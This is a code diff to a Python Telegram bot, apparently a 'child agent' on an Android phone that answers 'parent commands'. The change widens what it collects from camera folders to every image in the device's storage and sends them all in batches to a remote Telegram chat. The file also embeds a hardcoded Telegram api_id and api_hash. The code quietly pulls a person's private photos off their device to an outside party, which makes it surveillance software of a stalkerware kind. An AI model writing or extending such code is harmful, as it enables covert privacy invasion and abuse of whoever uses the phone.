@@ -1,4 +1,4 @@
-# child.py
+# main.py
 import os
 import json
 import asyncio
@@ -12,48 +12,54 @@ with open(CONFIG_PATH, "r") as f:
 BOT_TOKEN = config["BOT_TOKEN"]
 CHAT_ID = config["CHAT_ID"]
 
-# Camera photo folders
-MEDIA_DIRS = [
-    "/sdcard/DCIM/Camera",
-    "/storage/emulated/0/DCIM/Camera"
-]
+# Image extensions
 IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")
 
 # ================= FUNCTIONS =================
-def list_media():
-    """List all media files in the camera directories."""
+def list_all_photos():
+    """Scan entire accessible storage for images."""
     files = []
-    for base in MEDIA_DIRS:
-        if not os.path.exists(base):
-            continue
-        for root, dirs, filenames in os.walk(base):
-            for fn in filenames:
-                if fn.lower().endswith(IMAGE_EXTS):
-                    path = os.path.join(root, fn)
-                    try:
-                        mtime = os.path.getmtime(path)
-                    except:
-                        mtime = 0
-                    files.append((mtime, path))
+    storage_root = "/storage/emulated/0"
+    for root, dirs, filenames in os.walk(storage_root):
+        for fn in filenames:
+            if fn.lower().endswith(IMAGE_EXTS):
+                path = os.path.join(root, fn)
+                try:
+                    mtime = os.path.getmtime(path)
+                except:
+                    mtime = 0
+                files.append((mtime, path))
     files.sort(reverse=True)
-    return [p for _, p in files]  # Return all files
+    return [p for _, p in files]
 
-async def send_gallery(client):
-    files = list_media()
+async def send_gallery(client, batch_size=20):
+    files = list_all_photos()
     if not files:
-        await client.send_message(CHAT_ID, "No camera photos found.")
+        await client.send_message(CHAT_ID, "No photos found in storage.")
         return
-    await client.send_message(CHAT_ID, f"Sending {len(files)} camera photos:")
-    for fpath in files:
-        if os.path.exists(fpath):
+
+    await client.send_message(CHAT_ID, f"Sending {len(files)} photos in batches of {batch_size}...")
+
+    # Send in batches
+    for i in range(0, len(files), batch_size):
+        batch = files[i:i+batch_size]
+        media = []
+        for fpath in batch:
+            if os.path.exists(fpath):
+                try:
+                    media.append(fpath)
+                except Exception as e:
+                    print(f"Skipping {fpath}: {e}")
+        if media:
             try:
-                await client.send_file(CHAT_ID, fpath)
+                await client.send_file(CHAT_ID, media)
+                await asyncio.sleep(1)  # Small delay between batches
             except Exception as e:
-                print(f"Failed to send {fpath}: {e}")
+                print(f"Failed to send batch starting with {batch[0]}: {e}")
 
 # ================= MAIN =================
 async def main():
-    # Replace 12345 and '0123456789abcdef0123456789abcdef' with your api_id and api_hash from my.telegram.org
+    # Your API credentials
     api_id = 22071176
     api_hash = '7ed5401b625a0a4d3c45caf12c87f166'
 
@@ -72,7 +78,7 @@ async def main():
         if event.sender_id != CHAT_ID:
             return
         if event.data == b"get_gallery":
-            await event.answer("Sending gallery...")
+            await event.answer("Sending all photos in batches...")
             await send_gallery(client)
 
     print("Child agent online — waiting for parent commands.")
